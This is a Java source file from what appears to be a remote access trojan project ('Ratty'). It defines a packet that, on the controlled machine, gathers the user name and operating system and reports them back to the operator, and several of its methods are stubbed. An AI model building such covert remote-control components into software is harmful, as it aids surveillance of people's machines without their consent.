package de.sogomn.rat.packet.request;

import de.sogomn.rat.ActiveClient;
import de.sogomn.rat.Ratty;
import de.sogomn.rat.packet.IPacket;
import de.sogomn.rat.packet.InformationPacket;

public final class InformationRequestPacket implements IPacket {
	
	public InformationRequestPacket() {
		//...
	}
	
	@Override
	public void send(final ActiveClient client) {
		//...
	}
	
	@Override
	public void receive(final ActiveClient client) {
		//...
	}
	
	@Override
	public void execute(final ActiveClient client) {
		final String name = System.getProperty("user.name");
		final String os = System.getProperty("os.name");
		final InformationPacket packet = new InformationPacket(name, os, Ratty.VERSION);
		
		client.addPacket(packet);
	}
	
}
